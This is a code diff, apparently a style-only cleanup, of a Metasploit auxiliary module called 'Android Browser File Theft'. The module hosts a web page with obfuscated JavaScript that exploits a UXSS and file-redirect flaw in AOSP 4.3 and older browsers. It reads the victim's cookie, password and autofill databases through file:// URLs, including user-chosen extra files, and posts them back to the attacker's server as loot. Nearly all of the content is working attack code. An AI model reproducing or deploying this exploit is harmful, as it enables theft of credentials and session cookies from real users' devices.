@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -7,45 +8,43 @@ require 'msf/core'
 require 'msf/core/exploit/jsobfu'
 
 class MetasploitModule < Msf::Auxiliary
-
   include Msf::Exploit::Remote::HttpServer::HTML
   include Msf::Auxiliary::Report
   include Msf::Exploit::JSObfu
 
-  def initialize(info={})
+  def initialize(info = {})
     super(update_info(info,
-      'Name'        => 'Android Browser File Theft',
-      'Description' => %q{
-        This module steals the cookie, password, and autofill databases from the
-        Browser application on AOSP 4.3 and below.
-      },
-      'Author'         => [
-        'Rafay Baloch', # Found UXSS bug in Android Browser
-        'joev'          # File redirect and msf module
-      ],
-      'License'     => MSF_LICENSE,
-      'Actions'     => [[ 'WebServer' ]],
-      'PassiveActions' => [ 'WebServer' ],
-      'References' =>
-        [
-          # patch for file redirection, 2014
-          ['URL', 'https://android.googlesource.com/platform/packages/apps/Browser/+/d2391b492dec778452238bc6d9d549d56d41c107%5E%21/#F0'],
-          ['URL', 'https://code.google.com/p/chromium/issues/detail?id=90222'] # the UXSS
-        ],
-      'DefaultAction'  => 'WebServer'
-    ))
+                      'Name'        => 'Android Browser File Theft',
+                      'Description' => %q(
+                        This module steals the cookie, password, and autofill databases from the
+                        Browser application on AOSP 4.3 and below.
+                      ),
+                      'Author' => [
+                        'Rafay Baloch', # Found UXSS bug in Android Browser
+                        'joev'          # File redirect and msf module
+                      ],
+                      'License'     => MSF_LICENSE,
+                      'Actions'     => [[ 'WebServer' ]],
+                      'PassiveActions' => [ 'WebServer' ],
+                      'References' =>
+                        [
+                          # patch for file redirection, 2014
+                          ['URL', 'https://android.googlesource.com/platform/packages/apps/Browser/+/d2391b492dec778452238bc6d9d549d56d41c107%5E%21/#F0'],
+                          ['URL', 'https://code.google.com/p/chromium/issues/detail?id=90222'] # the UXSS
+                        ],
+                      'DefaultAction' => 'WebServer'))
 
-     register_options([
-      OptString.new('ADDITIONAL_FILES', [
-        false,
-        'Comma-separated list of addition file URLs to steal.',
-      ]),
-      OptBool.new('DEFAULT_FILES', [
-        true,
-        'Steals a default set of file URLs',
-        true
-      ])
-    ], self.class)
+    register_options([
+                       OptString.new('ADDITIONAL_FILES', [
+                                       false,
+                                       'Comma-separated list of addition file URLs to steal.'
+                                     ]),
+                       OptBool.new('DEFAULT_FILES', [
+                                     true,
+                                     'Steals a default set of file URLs',
+                                     true
+                                   ])
+                     ], self.class)
   end
 
   def run
@@ -53,7 +52,7 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def on_request_uri(cli, request)
-    if request.method.downcase == 'post'
+    if request.method.casecmp('post').zero?
       process_post(cli, request)
       send_response_html(cli, '')
     else
@@ -66,7 +65,7 @@ class MetasploitModule < Msf::Auxiliary
     data = JSON.parse(request.body)
     contents = hex2bin(data['data'])
     file = File.basename(data['url'])
-    print_good("File received: #{(contents.bytesize.to_f/1000).round(2)}kb #{file}")
+    print_good("File received: #{(contents.bytesize.to_f / 1000).round(2)}kb #{file}")
     loot_path = store_loot(
       file,
       'application/x-sqlite3',
@@ -77,7 +76,6 @@ class MetasploitModule < Msf::Auxiliary
     )
     print_good("Saved to: #{loot_path}")
   end
-
 
   def file_urls
     default_urls = [
@@ -90,26 +88,24 @@ class MetasploitModule < Msf::Auxiliary
       'file:///data/data/com.android.browser/databases/webviewCookiesChromiumPrivate.db'
     ]
 
-    unless datastore['DEFAULT_FILES']
-      default_urls = []
-    end
+    default_urls = [] unless datastore['DEFAULT_FILES']
 
-    default_urls + (datastore['ADDITIONAL_FILES']||'').split(',')
+    default_urls + (datastore['ADDITIONAL_FILES'] || '').split(',')
   end
 
   def exploit_html
-    %Q|
+    %(
       <!doctype html>
       <html>
       <body>
       <script>#{exploit_js}</script>
       </body>
       </html>
-    |
+    )
   end
 
   def exploit_js
-    js_obfuscate %Q|
+    js_obfuscate %|
       window.onmessage = function(e) {
         var x = new XMLHttpRequest;
         x.open("POST", location.href);
@@ -143,7 +139,7 @@ class MetasploitModule < Msf::Auxiliary
                     return (c.length < 2) ? 0+c : c;
                   }).join(new String);
                   /*ensures there are no 'not allowed' responses that appear to be valid data*/
-                  if (hex.length && hex.indexOf('#{Rex::Text.to_hex("<html><body>not allowed</body></html>","")}') === -1) {
+                  if (hex.length && hex.indexOf('#{Rex::Text.to_hex('<html><body>not allowed</body></html>', '')}') === -1) {
                     top.postMessage({data:hex,url:location.href}, '*');
                   }
                   parent.postMessage(1,'*');
@@ -179,5 +175,4 @@ class MetasploitModule < Msf::Auxiliary
   def hex2bin(hex)
     hex.chars.each_slice(2).map(&:join).map { |c| c.to_i(16) }.map(&:chr).join
   end
-
 end
